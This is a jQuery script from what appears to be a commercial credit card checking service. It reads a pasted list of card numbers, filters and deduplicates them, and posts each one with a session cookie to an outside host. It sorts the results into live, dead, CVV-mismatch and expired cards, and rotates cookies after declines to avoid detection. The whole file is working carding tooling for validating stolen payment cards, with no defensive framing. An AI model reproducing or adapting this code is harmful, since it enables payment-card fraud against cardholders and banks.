03940369$(document).ready(function(){
        $('#pause').click(function(event) {
            if (typeof ajaxCall == "object") ajaxCall.abort();
            $('#start').attr('disabled', false);
            $('#pause').attr('disabled', true);
            $('#loading').attr('src', base_url+'public/md5crack/img/clear.gif');            
        });
        
        $('#start').click(function(event) {
            var list_cc = $('#list_cc').val();
            window.delim = $('#delim').val().trim();

            window.num_failed_get_result = 0;
            window.count_checked_to_change_cookie = 0;
            window.max_checked_to_change_cookie = 2;                        

            var arr_cc = filterCC2(list_cc);

            if (validation_form_check(arr_cc)) return;

            $('#list_cc').val(arr_cc.join("\n"));

            $('#start').attr('disabled', true);
            $('#pause').attr('disabled', false);
            $('#loading').attr('src', base_url+'public/md5crack/img/loading.gif');

            var tong_cc_in_box = arr_cc.length;
            var tong_cc_checked = parseInt($('#cc_checked').html());

            var tong_cc = tong_cc_checked + tong_cc_in_box;

            $('#tong_cc').html(tong_cc);

            Check_cc (arr_cc, cur_cc = 0, name_cookie = "");
        });
    });



    function Check_cc (arr_cc, cur_cc, name_cookie) {
        if (cur_cc >= arr_cc.length) {
            show_modal_leftpanel("Complete");
            document.title = "Complete";
            $('#pause').click();
            return;
        }
        if (parseInt($('#tong_cc_live').html()) == parseInt($('#pause_khi_du_live').val())) {
            $('#pause').click();
            return;      
        }           
        ajaxCall = jQuery.ajax({
            url: 'https://alphacheck.online/ccv1.php',
            type: 'POST',
            dataType: 'json',
            data: `cc=${encodeURIComponent(arr_cc[cur_cc])}&alpha=${getCookie('alphacookie')}&name_cookie=${name_cookie}`,
            complete: function(xhr, textStatus) {},
            success: function(response, textStatus, xhr) {
                if (typeof response === "object" && response && response.success === true) 
                {
                    window.num_failed_get_result = 0;
                    if (response.data.status == "live") 
                    {
                        name_cookie = response.data.name_cookie;
                        if (name_cookie === "") {
                          window.count_checked_to_change_cookie = 0;
                        }else{
                          window.count_checked_to_change_cookie ++;
                        }
                        $('#show_cc_live').append('<b style="color:blue">Live</b>' + ' | ' + response.data.cc + ' | ' + location.host + '<br>');
                        $('#tong_cc_live').html(parseInt($('#tong_cc_live').html()) + 1);
                    } 
                    else if(response.data.status == "die")
                    {
                        name_cookie = response.data.name_cookie;
                        window.count_checked_to_change_cookie ++;
                        $('#show_cc_die').append('<b style="color:red">Die</b>' + ' | ' +  response.data.cc + ' | ' + location.host + '<br>');
                        $('#tong_cc_die').html(parseInt($('#tong_cc_die').html()) + 1);  
                    }
                    else if(response.data.status == "invalid_type")
                    {
                        name_cookie = response.data.name_cookie;
                        $('#show_cc_invalid_type').append('<b style="color:red">INV TYPE CCN</b>' + ' | ' + response.data.cc + ' | ' + location.host + '<br>');
                        $('#tong_cc_invalid_type').html(parseInt($('#tong_cc_invalid_type').html()) + 1);
                    }
                    else if(response.data.status == "cvv2_missmatch")
                    {
                        name_cookie = response.data.name_cookie;
                        $('#show_cc_cvv2_missmatch').append('<b style="color:red">Cvv2 Missmatch</b>' + ' | ' + response.data.cc + ' | ' + location.host + '<br>');
                        $('#tong_cc_cvv2_missmatch').html(parseInt($('#tong_cc_cvv2_missmatch').html()) + 1);
                    }                                                            
                    else if(response.data.status == "exp")
                    {
                        name_cookie = response.data.name_cookie;
                        $('#show_cc_exp').append('<b style="color:red">EXP</b>' + ' | ' + response.data.cc + ' | ' + location.host + '<br>');
                        $('#tong_cc_exp').html(parseInt($('#tong_cc_exp').html()) + 1);
                    }                              
                    else if(response.data.status == "unknown")
                    {
                        $('#show_cc_unk').append(response.data.cc + '<br>');
                        $('#tong_cc_unk').html(parseInt($('#tong_cc_unk').html()) + 1);

                        name_cookie = "";

                        // reset so lan die
                        window.count_checked_to_change_cookie = 0;                       
                    }

                    // Update s? cc da check
                    $('#cc_checked').html(parseInt($('#cc_checked').html()) + 1);

                    // Calculate percent
                    var temp = (parseInt($('#cc_checked').html()) * 100) / parseInt($('#tong_cc').html());
                    var percent = temp.toFixed(0) + '%'; 

                    // Update process bar
                    $('#progress_bar_success').css('width', percent);
                    $('.percent').html(percent); 

                    // Update title
                    document.title = 'Checked :' + percent;            

                    // Update box cc
                    update_box_cc (arr_cc[cur_cc]);


                    // change cookie if..
                    if (response.data.status == "die") 
                    {
                        if (window.count_checked_to_change_cookie == window.max_checked_to_change_cookie) 
                        {
                            name_cookie = "";

                            // reset so lan die
                            window.count_checked_to_change_cookie = 0;
                        }
                    }


                    // continue check other cc
                    Check_cc (arr_cc, cur_cc + 1, name_cookie);
                    return; 
                } 
                else if (typeof response === "object" && response && response.success === false)  
                {
                    window.num_failed_get_result = 0;
                    if (response.error.id == 1) {
                        // reset so lan die
                        window.count_checked_to_change_cookie = 0;                  


                        Check_cc (arr_cc, cur_cc, name_cookie = "");
                        return;
                    } 
                    else if(response.error.id == 2){
                        show_modal_leftpanel("Your balance is not enough to check.");
                        return;   
                    }
                    else if(response.error.id == 3){
                        window.count_checked_to_change_cookie = 0;
                        Check_cc (arr_cc, cur_cc, name_cookie = "");
                        return;
                    }
                    else if(response.error.id == 4){
                        show_modal_leftpanel('We are maintenance, please come back later.');
                        return;                
                    }            
                }
                else
                {
                    window.num_failed_get_result ++;
                    if (window.num_failed_get_result > 5) {
                        show_modal_leftpanel('Please F5 to reload page. DDoS protection by CloudFlare. Contact ICQ: 693610132');
                        return;
                    }
                    return Check_cc (arr_cc, cur_cc, name_cookie);
                }
            },
            error: function(xhr, textStatus, errorThrown) {
                if (xhr.status == 403 && errorThrown == "Forbidden" && xhr.statusText == "Forbidden") {
                    show_modal_leftpanel('Please F5 to reload page. DDoS protection by CloudFlare');
                    return;
                }
                else if (textStatus == "503 Service Temporarily Unavailable") {
                    show_modal_leftpanel('Please F5 to reload page. DDoS protection by CloudFlare');
                    return;
                }
                else if (textStatus == "524 Origin Time-out" || textStatus != 'abort') {
                    window.num_failed_get_result ++;
                    if (window.num_failed_get_result > 15) {
                        show_modal_leftpanel(`Failed, ${errorThrown}, ${textStatus}. Contact ICQ: 693610132`);
                        return;
                    }
                    window.count_checked_to_change_cookie = 0;
                    Check_cc (arr_cc, cur_cc, name_cookie = "");
                    return;
                }
                else{
                  jQuery.gritter.add({
                    title: 'NOTICE',
                    text: `Failed, ${errorThrown}, ${textStatus}`,
                    class_name: 'growl-danger',
                    sticky: true,
                    time: '5000'
                  });
                }       
            }
        });
    }  


  

    Array.prototype.notInItem = function(string) {
    for (var i = 0; i < this.length; i++)
      if (typeof string === "string" && this[i].includes(string)) return false;
    return true;
  };
  
  Array.prototype.remove = function(value) {
      var index = this.indexOf(value);
      if (index != -1) {
          this.splice(index, 1);
      }
      return this;
  };

  function validation_form_check() {
      var content_error = [];

      if (arguments[0].length == 0)
          content_error.push("The CC field is required");

      if (content_error.length == 0){
          $('#error').html("").hide();
          return false;
      }else{
          $('#error').html(content_error.join("<br>")).show();
          $(window).scrollTop(0);
          return true;
      }
  }

  function update_box_cc(cc) {
      var arr_cc = $("#list_cc").val().split("\n");
      arr_cc.remove(cc);
      $('#list_cc').val(arr_cc.join("\n"));
  }

  function remove_duplicate (arr) {
      var uniqueNames = [];
      $.each(arr, function(i, el){
          if($.inArray(el, uniqueNames) === -1) uniqueNames.push(el);
      });
      return uniqueNames;    
  }

  function filterCC2(cc) {
      var ccs = cc.split('\n');
      var filtered = [];
      var lstcc = [];
      for (var i = 0; i < ccs.length; i++) {
          if (ccs[i].length > 0) {
              var variable2c = /(?:4[0-9]{12}(?:[0-9]{3})?|5[0-9][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})/g;
              var variable2d = ccs[i].match(variable2c);              
              var ccn_8 = variable2d[0].substring(0,10);
              if (filtered.notInItem(ccn_8)) {
                    filtered.push(variable2d[0]);
                    lstcc.push(ccs[i]);
              }
          }
      }
      return lstcc;
  }

  var LuhnCheck = (function() {
      var variable2f = [0, 2, 4, 6, 8, 1, 3, 5, 7, 9];
      return function(variable26) {
          var variable30 = 0;
          var variable31;
          var variable32 = false;
          var variable33 = String(variable26).replace(/[^\d]/g, "");
          if (variable33.length === 0) {
              return false;
          }
          for (var i = variable33.length - 1; i >= 0; --i) {
              variable31 = parseInt(variable33.charAt(i), 10);
              variable30 += (variable32 = !variable32) ? variable31 : variable2f[variable31];
          }
          return (variable30 % 10 === 0);
      }
  });

  function getCookie(cname) {
    var name = cname + "=";
    var decodedCookie = document.cookie;
    var ca = decodedCookie.split(';');
    for(var i = 0; i <ca.length; i++) {
      var c = ca[i];
      while (c.charAt(0) == ' ') {
        c = c.substring(1);
      }
      if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
      }
    }
    return "";
  }
